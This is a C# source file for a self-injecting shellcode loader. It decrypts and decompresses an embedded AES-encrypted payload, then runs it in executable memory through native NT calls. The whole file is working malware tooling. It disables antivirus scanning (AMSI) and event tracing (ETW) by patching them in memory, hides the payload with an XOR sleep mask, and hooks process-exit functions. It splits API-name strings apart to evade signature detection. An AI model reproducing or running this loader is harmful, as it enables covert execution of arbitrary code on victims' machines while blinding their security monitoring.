using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace CSB2SelfInject
{
    public class Program
    {
        static byte[] AESDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream(ciphertext))
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (MemoryStream result = new MemoryStream())
                {
                    cs.CopyTo(result);
                    return result.ToArray();
                }
            }
        }

        static byte[] Decompress(byte[] data)
        {
            using (MemoryStream input = new MemoryStream(data))
            using (MemoryStream output = new MemoryStream())
            using (DeflateStream dStream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dStream.CopyTo(output);
                return output.ToArray();
            }
        }

        static void SleepMask(int milliseconds, byte[] xorKey, IntPtr address, int size)
        {
            byte[] buf = new byte[size];
            Marshal.Copy(address, buf, 0, size);

            for (int i = 0; i < size; i++)
                buf[i] ^= xorKey[i % xorKey.Length];
            Marshal.Copy(buf, 0, address, size);

            Thread.Sleep(milliseconds);

            for (int i = 0; i < size; i++)
                buf[i] ^= xorKey[i % xorKey.Length];
            Marshal.Copy(buf, 0, address, size);
        }

        static void JitterDelay(int minMs = 2000, int maxMs = 6000)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] randBytes = new byte[4];
                rng.GetBytes(randBytes);
                int seed = BitConverter.ToInt32(randBytes, 0) & 0x7FFFFFFF;
                int delay = minMs + (seed % (maxMs - minMs));

                long start = DateTime.UtcNow.Ticks;
                while ((DateTime.UtcNow.Ticks - start) / TimeSpan.TicksPerMillisecond < delay)
                {
                    uint junk = 0xDEADBEEF;       
                    for (int i = 0; i < 100; i++)
                        junk = (junk << 3) ^ (junk >> 5) + 0xAABBCCDD;
                }
            }
        }

        public static void Main()
        {
            byte[] aesKey = Convert.FromBase64String("BaVEoIJujlYavjiYbLZfrtSzur1mvh1f2oH2t3WHx0k=");
            byte[] aesIV = Convert.FromBase64String("zrQHw9KZYlOxnIhx7SqoBw==");

            var encryptedLayer = Convert.FromBase64String("ZWuxO4Uwkn6yEcwQPfPoaPsHJmU7p11XoheY37fWa6SXjO8W3GT5iv8nDMgiDqSFLpFJHFgQMhpqk4QcL0P5gtCFuP6B/PhaFh0twn9eNWiVGl4tKWivZj7sSY95leEUXjuR85mYOvQMMWBIOrKfQVokY1lISWU4hpYBYGcVHTDohseLXgAiBjeOOu7WzoAwFotOVRIhv4O5dBljzRignDNyO5KZ8FuGc403VmxgoJ4mCMauH6QHaO5EA/4EDrC/SFGFbr89Ly7l91HRvWPk/wylW9wI9UwYeuabi63sc+fWESdfYCmAjyK7EZziRbWKZ66CJZ00fkvvG2o8GmNBsuKkGRnm/015KhVq2g/C8x276vpkTyfd3mOzFplEdXwYVDLnWOHsOlHpCVo64IzshdrdoKEBEHVFxAoc3VzVpFsQlNVyh2TwNUazlE6kXRuzZZrVIjeW5RMtcshHshz9RgdEy/aJz9FgKQgHb8FCY99QcXftpo0U6AG1t0H2+WoE7foM5QiLmgHzBActo0OOYYWU0QXmVQSUFw7WR2K7nMp3CbxwduvfqIHbmdXN4FQf8ax4L6lv2yq0bMLCHv8WWvVqWwg0v0aCSAS/SkwteZE=");

            var compressed = AESDecrypt(encryptedLayer, aesKey, aesIV);
            var rawBytes = Decompress(compressed);

            JitterDelay(3000, 7000);

            Evasion.PatchAmsi();
            Evasion.PatchEtw();

            IntPtr baseAddr = IntPtr.Zero;
            uint regionSize = (uint)rawBytes.Length;
            NTStatus status = DPInvoke.NtAllocateVirtualMemory(new IntPtr(-1), ref baseAddr, IntPtr.Zero, ref regionSize, 0x3000, 0x40);

            if (status != NTStatus.Success)
                throw new Win32Exception("NtAllocateVirtualMemory failed: " + status);

            Marshal.Copy(rawBytes, 0, baseAddr, rawBytes.Length);

            ExitPatcher.PatchExit();

            byte[] maskKey = Encoding.ASCII.GetBytes("N0MadM3d1c!c4t3D");
            SleepMask(1500, maskKey, baseAddr, rawBytes.Length);

            uint oldProtect = 0;
            status = DPInvoke.NtProtectVirtualMemory(new IntPtr(-1), ref baseAddr, ref regionSize, 0x20, ref oldProtect);

            if (status != NTStatus.Success)
                throw new Win32Exception("NtProtectVirtualMemory failed: " + status);

            IntPtr hThread = IntPtr.Zero;
            status = DPInvoke.NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, new IntPtr(-1), baseAddr, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);

            if (status != NTStatus.Success)
                throw new Win32Exception("NtCreateThreadEx failed: " + status);

            DPInvoke.WaitForSingleObject(hThread, 0xFFFFFFFF);

            DPInvoke.NtClose(hThread);
            DPInvoke.NtFreeVirtualMemory(new IntPtr(-1), ref baseAddr, ref regionSize, 0x8000);

            ExitPatcher.ResetExitFunctions();
        }

        internal class Evasion
    {

        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        public static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = DPInvoke.GetModuleHandle("a" + "msi" + ".d" + "ll");
                if (hAmsi == IntPtr.Zero) return;

                IntPtr pAmsiScanBuffer = DPInvoke.GetProcAddress(hAmsi, "Am" + "siSc" + "anBu" + "ffer");
                if (pAmsiScanBuffer == IntPtr.Zero) return;

                byte[] patch = { 0x31, 0xC0, 0xC3 }; 
                DPInvoke.VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out uint old);
                
                Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                DPInvoke.VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, old, out _);
            }
            catch { }
        }

        
        public static void PatchEtw()
        {
            try
            {
                IntPtr hNtdll = DPInvoke.GetModuleHandle("nt" + "dll" + ".dll");
                if (hNtdll == IntPtr.Zero) return;

                IntPtr pEtwEventWrite = DPInvoke.GetProcAddress(hNtdll,
                    "Etw" + "Eve" + "ntWr" + "ite");
                if (pEtwEventWrite == IntPtr.Zero) return;

                byte[] patch = { 0xC3 }; 

                DPInvoke.VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out uint old);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                DPInvoke.VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, old, out _);
            }
            catch { }
        }
    }

    internal enum NTStatus : uint
    {
        Success = 0x00000000,
        AccessDenied = 0xC0000022,
        InvalidHandle = 0xC0000008,
    }

    internal class DPInvoke
    {
        private static object DynamicPInvokeBuilder(Type returnType, string library, string method, object[] parameters, Type[] parameterTypes)
        {
            var asmName = new AssemblyName("T" + "em" + "p0" + "1");
            var asmBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(asmName, AssemblyBuilderAccess.Run);
            var modBuilder = asmBuilder.DefineDynamicModule("T" + "em" + "p0" + "2");

            var mb = modBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, returnType, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

            mb.SetImplementationFlags(mb.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig); 
            modBuilder.CreateGlobalFunctions();

            var dynMethod = modBuilder.GetMethod(method);
            return dynMethod.Invoke(null, parameters);
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            Type[] pt = { typeof(string) };
            object[] p = { lpModuleName };
            return (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "ke" + "rne" + "l32." + "dll", "Ge" + "tMo" + "dul" + "eHa" + "ndle", p, pt);
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            Type[] pt = { typeof(IntPtr), typeof(string) };
            object[] p = { hModule, procName };
            return (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "ke" + "rne" + "l32." + "dll", "Ge" + "tPr" + "ocA" + "ddr" + "ess", p, pt);
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint old = 0;
            Type[] pt = { typeof(IntPtr), typeof(UIntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            object[] p = { lpAddress, dwSize, flNewProtect, old };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), "ke" + "rne" + "l32." + "dll", "Vi" + "rtua" + "lPro" + "tect", p, pt);
            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)p[3];
            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            Type[] pt = { typeof(IntPtr), typeof(uint) };
            object[] p = { Handle, Wait };
            return (uint)DynamicPInvokeBuilder(typeof(uint), "ke" + "rne" + "l32." + "dll", "Wa" + "itFo" + "rSi" + "ngl" + "eOb" + "ject", p, pt);
        }

        // ── ntdll (NT API) ──────────────────────────────────────────────
        public static NTStatus NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect)
        {
            Type[] pt = { typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(uint).MakeByRefType(), typeof(uint), typeof(uint) };
            object[] p = { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "nt" + "dll" + ".d" + "ll", "Nt" + "All" + "oca" + "teV" + "irt" + "ual" + "Mem" + "ory", p, pt);
            BaseAddress = (IntPtr)p[1];
            RegionSize = (uint)p[3];
            return (NTStatus)result;
        }

        public static NTStatus NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, ref uint OldProtect)
        {
            Type[] pt = { typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(uint).MakeByRefType(), typeof(uint), typeof(uint).MakeByRefType() };
            object[] p = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "nt" + "dll" + ".d" + "ll", "Nt" + "Pro" + "tec" + "tVi" + "rtu" + "alM" + "emo" + "ry", p, pt);
            BaseAddress = (IntPtr)p[1];
            RegionSize = (uint)p[2];
            OldProtect = (uint)p[4];
            return (NTStatus)result;
        }

        public static NTStatus NtCreateThreadEx(ref IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList)
        {
            Type[] pt = { typeof(IntPtr).MakeByRefType(), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(IntPtr) };
            object[] p = { ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartAddress, Parameter, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "nt" + "dll" + ".d" + "ll", "Nt" + "Cre" + "ate" + "Thr" + "ead" + "Ex", p, pt);
            ThreadHandle = (IntPtr)p[0];
            return (NTStatus)result;
        }

        public static NTStatus NtClose(IntPtr Handle)
        {
            Type[] pt = { typeof(IntPtr) };
            object[] p = { Handle };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "nt" + "dll" + ".d" + "ll", "Nt" + "Clo" + "se", p, pt);
            return (NTStatus)result;
        }

        public static NTStatus NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint FreeType)
        {
            Type[] pt = { typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(uint).MakeByRefType(), typeof(uint) };
            object[] p = { ProcessHandle, BaseAddress, RegionSize, FreeType };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "nt" + "dll" + ".d" + "ll", "Nt" + "Fre" + "eVi" + "rtu" + "alM" + "emo" + "ry", p, pt);
            BaseAddress = (IntPtr)p[1];
            RegionSize = (uint)p[2];
            return (NTStatus)result;
        }
    }

    internal class ExitPatcher
    {
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        private static byte[] _terminateProcessOriginalBytes;
        private static byte[] _ntTerminateProcessOriginalBytes;
        private static byte[] _rtlExitUserProcessOriginalBytes;
        private static byte[] _corExitProcessOriginalBytes;

        private static byte[] PatchFunction(string dll, string func, byte[] patch)
        {
            var hMod = DPInvoke.GetModuleHandle(dll);
            var pFn = DPInvoke.GetProcAddress(hMod, func);

            var orig = new byte[patch.Length];
            Marshal.Copy(pFn, orig, 0, patch.Length);

            if (!DPInvoke.VirtualProtect(pFn, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out var old))
                return null;

            Marshal.Copy(patch, 0, pFn, patch.Length);
            DPInvoke.VirtualProtect(pFn, (UIntPtr)patch.Length, old, out _);
            return orig;
        }

        public static bool PatchExit()
        {
            var hKb = DPInvoke.GetModuleHandle("ke" + "rne" + "lba" + "se");
            var pExitTh = DPInvoke.GetProcAddress(hKb, "Ex" + "itT" + "hre" + "ad");

            var patch = new List<byte>
            {
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,
                0x48, 0xB8
            };
            patch.AddRange(BitConverter.GetBytes(pExitTh.ToInt64()));
            patch.Add(0x50);
            patch.Add(0xC3);

            var arr = patch.ToArray();

            _terminateProcessOriginalBytes = PatchFunction("ke" + "rne" + "lba" + "se", "Te" + "rmin" + "ate" + "Pro" + "cess", arr);
            if (_terminateProcessOriginalBytes == null) return false;

            _corExitProcessOriginalBytes = PatchFunction("ms" + "cor" + "ee", "Co" + "rEx" + "itPr" + "ocess", arr);
            if (_corExitProcessOriginalBytes == null) return false;

            _ntTerminateProcessOriginalBytes = PatchFunction("ntd" + "ll", "NtT" + "erm" + "ina" + "tePr" +  "oce" + "ss", arr);
            if (_ntTerminateProcessOriginalBytes == null) return false;

            _rtlExitUserProcessOriginalBytes =
                PatchFunction("ntd" + "ll", "Rt" + "lEx" + "itU" + "ser" + "Pro" + "cess", arr);
            if (_rtlExitUserProcessOriginalBytes == null) return false;

            return true;
        }

            public static void ResetExitFunctions()
            {
                if (_terminateProcessOriginalBytes != null)
                    PatchFunction("ke" + "rne" + "lba" + "se", "Te" + "rmin" + "ate" + "Pro" + "cess", _terminateProcessOriginalBytes);
                if (_corExitProcessOriginalBytes != null)
                    PatchFunction("ms" + "cor" + "ee", "Co" + "rEx" + "itPr" + "ocess", _corExitProcessOriginalBytes);
                if (_ntTerminateProcessOriginalBytes != null)
                    PatchFunction("ntd" + "ll", "NtT" + "erm" + "ina" + "tePr" + "oce" + "ss",  _ntTerminateProcessOriginalBytes);
                if (_rtlExitUserProcessOriginalBytes != null)
                    PatchFunction("ntd" + "ll", "Rt" + "lEx" + "itU" + "ser" + "Pro" + "cess", _rtlExitUserProcessOriginalBytes);
            }
        }
    }
}